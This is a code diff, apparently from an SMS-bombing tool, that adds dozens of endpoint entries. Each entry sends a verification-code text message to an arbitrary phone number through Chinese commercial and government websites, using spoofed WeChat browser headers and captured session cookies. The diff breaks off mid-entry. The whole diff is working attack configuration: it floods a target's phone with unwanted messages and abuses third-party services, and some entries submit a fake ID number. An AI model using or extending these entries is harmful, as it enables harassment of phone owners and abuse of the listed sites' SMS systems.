@@ -2774,6 +2774,574 @@ button:hover {
                 
                 })
            },
+           {
+                url: 'https://yero.com.cn/wap//index.php?c=ajax&a=regcode',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'yero.com.cn',
+                    'Connection': 'keep-alive',
+                    'Accept': '*/*',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'https://yero.com.cn',
+                    'X-Requested-With': 'mark.via.gp',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://yero.com.cn/wap/index.php?c=register',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': 'wap_bannerFlag=1'
+                }),
+                data: (phoneNumber, times) => ({
+                    'moblie': phoneNumber
+
+                })
+            },
+            {
+                url: 'http://asrc.qianhuaweb.com:8000/api/ac/anshantalent/sendMsgServiceImpl/sendMsg',
+                method: 'POST_JSON',
+                headers: () => ({
+                    'Host': 'asrc.qianhuaweb.com:8000',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json, text/plain, */*',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/json; charset=UTF-8',
+                    'Origin': 'http://asrc.qianhuaweb.com:8000',
+                    'X-Requested-With': 'mark.via.gp',
+                    'Referer': 'http://asrc.qianhuaweb.com:8000/',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'
+                }),
+                data: (phoneNumber, times) => ({
+                    'telephone': phoneNumber
+
+                })
+            },
+            {
+                url: 'https://www.trggrc.com/mobile/members/reg_send_sms.html',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'www.trggrc.com',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Origin': 'https://www.trggrc.com',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://www.trggrc.com/mobile/members/register.html',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': 'PHPSESSID=jomuv8kod8k5s2937mb0gn9vb0; think_language=zh-CN; think_template=default; SECKEY_ABVK=JPSGzlretKubmWO4zefj+OrQLdDvOfzn9L47BF3kUJKumS451L+aZWYc7vX/u1rFuElI7yweXytUH0Ny0T5lnQ%3D%3D; cookie_lat=22.8226066; cookie_lng=108.37345083; BMAP_SECKEY=JPSGzlretKubmWO4zefj-OrQLdDvOfzn9L47BF3kUJJDFNZs7lkE3wvIMm1CfwOtBFP21ZiyfqdtR7xwZBOcIsqZ9Q4uzZR98H-5gmULA50uIDkgrXyvY_cpjrd9lFl_P1WR8B3T8dR9UeE4GRMpQlXlRfxrHEBdx59GM7L4HvEdCW2iPKPdwK1S5mRG-EIgHWPHJsxsYwZ2yEIlDSZLeQ; return_url=https%3A%2F%2Fwww.trggrc.com%2FMobile'
+                }),
+                data: (phoneNumber, times) => ({
+                    'sms_type': 'login',
+                    'mobile': phoneNumber
+
+                })
+            },
+            {
+                url: 'http://m.cangxi.ccoo.cn/Sms/SendSmsCode',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'm.cangxi.ccoo.cn',
+                    'Connection': 'keep-alive',
+                    'Accept': '*/*',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Origin': 'http://m.cangxi.ccoo.cn',
+                    'Referer': 'http://m.cangxi.ccoo.cn/reg/phonereg.aspx',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': 'siteid=2033; sitename=%e8%8b%8d%e6%ba%aa%e5%9c%a8%e7%ba%bf; guid=T02D84F0F6420622RT2LFZXH40BPV80H; uid=535; wxlevel=0; isccmy=0; _appDialogOne=1; _checkuser=1; codeconfig=; notcode=1; _appDialogTime=2; SendSmsCode=c8abc3f473; isjf=1; smstimes=60; sendsms=1'
+                }),
+                data: (phoneNumber, times) => ({
+                    'phone': phoneNumber,
+                    'Ot': '6',
+                    'sign': 'X021737643222'
+
+                })
+            },
+            {
+                url: 'https://bdc.nngeo.com/account/SendValidCode',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'bdc.nngeo.com',
+                    'Connection': 'keep-alive',
+                    'Accept': '*/*',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'https://bdc.nngeo.com',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://bdc.nngeo.com/account/register',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': 'acw_tc=ac11000117381307467603103e004dacdf109c48bd049a8666c55aaa2447d9; __RequestVerificationToken=Val6X93MNcZ-5Q3STWOpYYEeiHGY0k0jTHul_ya5DTn7XcgW4fWBSshY2DfnHfKvAmywSbrICMNPvxdtTZDGD_VfmTU1; style=null'
+                }),
+                data: (phoneNumber, times) => ({
+                    'phonenumber': phoneNumber
+
+                })
+            },
+            {
+                url: 'http://www.ccfcda.net/sendMessageRegister.do',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'www.ccfcda.net',
+                    'Connection': 'keep-alive',
+                    'Accept': '*/*',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'http://www.ccfcda.net',
+                    'Referer': 'http://www.ccfcda.net/member/register.html?returnUrl%20=%20encodeURIComponent(window.location.href)',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': 'JSESSIONID=C486919709250C01E95C08EA9D8DF9F1'
+                }),
+                data: (phoneNumber, times) => ({
+                    'mobile': phoneNumber,
+                    'templateCode': 'SMS_84710052'
+
+                })
+            },
+            {
+                url: 'http://bdcdj.zrzy.dt.gov.cn/online/platform/sys/user/checking',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'bdcdj.zrzy.dt.gov.cn',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json, text/javascript, */*; q=0.01',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'http://bdcdj.zrzy.dt.gov.cn',
+                    'Referer': 'http://bdcdj.zrzy.dt.gov.cn/online/platform/sys/user/register2',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': 'sid=da214a5e-7afd-4e20-bc8c-5c8fc340bae8'
+                }),
+                data: (phoneNumber, times) => ({
+                    'phone': phoneNumber
+
+                })
+            },
+            {
+                url: 'http://www.llsbdc.cn/online/platform/sys/user/checking',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'www.llsbdc.cn',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json, text/javascript, */*; q=0.01',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'http://www.llsbdc.cn',
+                    'Referer': 'http://www.llsbdc.cn/online/platform/sys/user/register2',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': 'sid=a50dedee-104c-453e-a540-023e34ddfacd'
+                }),
+                data: (phoneNumber, times) => ({
+                    'phone': phoneNumber
+
+                })
+            },
+            {
+                url: 'https://bhsbdcdjzx.com/account/SendValidCode',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'bhsbdcdjzx.com',
+                    'Connection': 'keep-alive',
+                    'Accept': '*/*',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'https://bhsbdcdjzx.com',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://bhsbdcdjzx.com/account/register',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': 'name=value; acw_tc=784e2c9817381330811278946e78f18522d0a89177042ec529c25c13423f11; __RequestVerificationToken=V2vb_kWTwAvuRbRyVJQCRM3BHMRTmMmSlnVQTU76iIfPudbcBxTbMwKPWLxC5MvuPJNnreN5Fvt4fjgzzR23HWMrN5o1; name=value; accept=true'
+                }),
+                data: (phoneNumber, times) => ({
+                    'phonenumber': phoneNumber
+
+                })
+            },
+            {
+                url: 'https://zrgh.chengde.gov.cn/online/platform/sys/user/phong_wjmm_yzm',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'zrgh.chengde.gov.cn',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json, text/javascript, */*; q=0.01',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'https://zrgh.chengde.gov.cn',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://zrgh.chengde.gov.cn/online/platform/login/wjmm',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': 'sid=995c90d0-42a7-425a-b1ca-b9e1af19533f; Path=/'
+                }),
+                data: (phoneNumber, times) => ({
+                    'phone': phoneNumber
+
+                })
+            },
+            {
+                url: 'http://www.afxbdc.cn/module/view/getPhoneCode.do',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'www.afxbdc.cn',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json, text/javascript, */*; q=0.01',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'http://www.afxbdc.cn',
+                    'Referer': 'http://www.afxbdc.cn/common/pc/login_gr.html?openlayer=open&type=z',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': 'kanq-upms-client-session-id=9655d25c-7a72-4572-8564-fcdc27fdf665; lang=zh_CN'
+                }),
+                data: (phoneNumber, times) => ({
+                    'SJH': phoneNumber,
+                    'CZLX': 'YYCX',
+                    'pageType': 'view',
+                    'lang': 'zh_CN'
+
+                })
+            },
+            {
+                url: 'https://ynsbdcdjzx.yining.gov.cn/module/view/getPhoneCode.do',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'ynsbdcdjzx.yining.gov.cn',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json, text/javascript, */*; q=0.01',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'https://ynsbdcdjzx.yining.gov.cn',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://ynsbdcdjzx.yining.gov.cn/common/pc/login_gr.html?openlayer=open&type=zc',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': 'kanq-upms-client-session-id=8030dcc8-2359-4e15-90db-7044346132cf; lang=zh_CN'
+                }),
+                data: (phoneNumber, times) => ({
+                    'SJH': phoneNumber,
+                    'CZLX': 'YYCX',
+                    'pageType': 'view',
+                    'lang': 'zh_CN'
+
+                })
+            },
+            {
+                url: 'https://pc.ga.ordos.gov.cn/ssoServer/sms/getCode',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'pc.ga.ordos.gov.cn',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json, text/javascript, */*; q=0.01',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'https://pc.ga.ordos.gov.cn',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://pc.ga.ordos.gov.cn/ssoServer/register',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': 'SESSION=1c355259-0cdc-45e1-b0ee-6863ad1cf6db; JSESSIONID=C56211C273F44F4ECC8BDEEDDA0ACDBE; _gscu_1965747770=3821489804ojb660; _gscbrs_1965747770=1; _gscs_1965747770=38214898kwjngv60|pv:1; mozi-assist={%22show%22:false%2C%22audio%22:false%2C%22speed%22:%22middle%22%2C%22zomm%22:1%2C%22cursor%22:false%2C%22pointer%22:false%2C%22bigtext%22:false%2C%22overead%22:false}'
+                }),
+                data: (phoneNumber, times) => ({
+                    'mobile': phoneNumber,
+                    'smsType': 'REGISTER',
+                    'userType': '1',
+                    'corporateCode': ''
+
+                })
+            },
+            {
+                url: 'http://gat.qinghai.gov.cn/stmhwz/user/sendMessages',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'gat.qinghai.gov.cn',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json, text/javascript, */*; q=0.01',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'http://gat.qinghai.gov.cn',
+                    'Referer': 'http://gat.qinghai.gov.cn/stmhwz/user/toRegister',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': 'JSESSIONID=B39EABB05E798E0BBCBE4ABC99EB65EF'
+                }),
+                data: (phoneNumber, times) => ({
+                    'pNumber': phoneNumber,
+                    'tpyz': 'TCUR'
+
+                })
+            },
+            {
+                url: 'https://mapi.312green.com/verify',
+                method: 'POST_JSON',
+                headers: () => ({
+                    'Host': 'mapi.312green.com',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json, text/plain, */*',
+                    'mqq-platform': 'pc',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'au-v': '4a0d860840115f6bcdbbc53531530fcd',
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://www.312green.com',
+                    'X-Requested-With': 'mark.via.gp',
+                    'Referer': 'https://www.312green.com/login?redirect=%2F',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'
+                }),
+                data: (phoneNumber, times) => ({
+                    'mobile': phoneNumber,
+                    'type': 'register'
+
+                })
+            },
+            {
+                url: 'https://fuwu.wsgjp.com/clueForm/getVerifyCode',
+                method: 'POST_JSON',
+                headers: () => ({
+                    'Host': 'fuwu.wsgjp.com',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json, text/javascript, */*; q=0.01',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://register.wsgjp.com.cn',
+                    'X-Requested-With': 'mark.via.gp',
+                    'Sec-Fetch-Site': 'cross-site',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://register.wsgjp.com.cn/',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'
+                }),
+                data: (phoneNumber, times) => ({
+                    'phone': phoneNumber,
+                    'router': 'register.wsgjp.com.cn'
+
+                })
+            },
+            {
+                url: 'http://jswjj.esjkkj.com:8085/wxgzh/sendSms',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'jswjj.esjkkj.com:8085',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json, text/javascript, */*; q=0.01',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'http://jswjj.esjkkj.com:8085',
+                    'Referer': 'http://jswjj.esjkkj.com:8085/wxgzh/html/login.html',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'
+                }),
+                data: (phoneNumber, times) => ({
+                    'sfzh': '123456789012345678',
+                    'xm': 'Test',
+                    'jttel': phoneNumber
+
+                })
+            },
+            {
+                url: 'https://orderxcx.gzjimmymove.com/proxy/moveService/api/app/user/sendVerifyCode',
+                method: 'POST_JSON',
+                headers: () => ({
+                    'Host': 'orderxcx.gzjimmymove.com',
+                    'Connection': 'keep-alive',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'city': 'sz',
+                    'Content-Type': 'application/json',
+                    'Accept': '*/*',
+                    'Origin': 'https://orderxcx.gzjimmymove.com',
+                    'X-Requested-With': 'mark.via.gp',
+                    'Referer': 'https://orderxcx.gzjimmymove.com/',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'
+                }),
+                data: (phoneNumber, times) => ({
+                    'phone': phoneNumber,
+                    'code': '',
+                    'city': 'sz'
+
+                })
+            },
+            {
+                url: 'https://www.hedaoapp.com/Photo/SendCode',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'www.hedaoapp.com',
+                    'Connection': 'keep-alive',
+                    'Accept': '*/*',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'https://www.hedaoapp.com',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://www.hedaoapp.com/Photo/register?wid=0',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'
+                }),
+                data: (phoneNumber, times) => ({
+                    'phone': phoneNumber,
+                    'type': '0'
+
+                })
+            },
+            {
+                url: 'https://seller.qbb6.com/sendCode/',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'seller.qbb6.com',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json, text/javascript, */*; q=0.01',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'https://seller.qbb6.com',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://seller.qbb6.com/registerPage/',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': 'acw_tc=0aef816617392560494756794e003e6f498b6291df9f80e361196385e8f887; SESSION=1785c3b4-54b3-4a42-a2ff-f8a574790ddb'
+                }),
+                data: (phoneNumber, times) => ({
+                    'phone': phoneNumber,
+                    'sendType': '0',
+                    'simple': '0'
+
+                })
+            },
+            {
+                url: 'https://www.jszg.edu.cn/web/rest/edu/website/historyValid/sendCheckSms',
+                method: 'POST_JSON',
+                headers: () => ({
+                    'Host': 'www.jszg.edu.cn',
+                    'Connection': 'keep-alive',
+                    'Accept': '*/*',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://www.jszg.edu.cn',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://www.jszg.edu.cn/certificateVerification.html',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Cookie': '__jsluid_s=836495044287865407a2c5cbb1c324e9'
+                }),
+                data: (phoneNumber, times) => ({
+                    'mobile': phoneNumber
+
+                })
+            },
+            {
+                url: 'https://shop.kuaishang.cn/OnlineReg//v2/sendSms.do',
+                method: 'POST_FORM',
+                headers: () => ({
+                    'Host': 'shop.kuaishang.cn',
+                    'Connection': 'keep-alive',
+                    'Accept': '*/*',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Origin': 'https://shop.kuaishang.cn',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Referer': 'https://shop.kuaishang.cn/index.htm?refer=indexWebsiteNavigationDrop&previous=http://www.kuaishang.cn/',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'
+                }),
+                data: (phoneNumber, times) => ({
+                    'phone': phoneNumber,
+                    'authCode': '',
+                    'isSms': 'true'
+
+                })
+            },
+            {
+                url: 'https://wz.stcir.com/applet/sms/getPhoneCode',
+                method: 'POST_JSON',
+                headers: () => ({
+                    'Host': 'wz.stcir.com',
+                    'Connection': 'keep-alive',
+                    'Accept': 'application/json, text/plain, */*',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://wz.stcir.com',
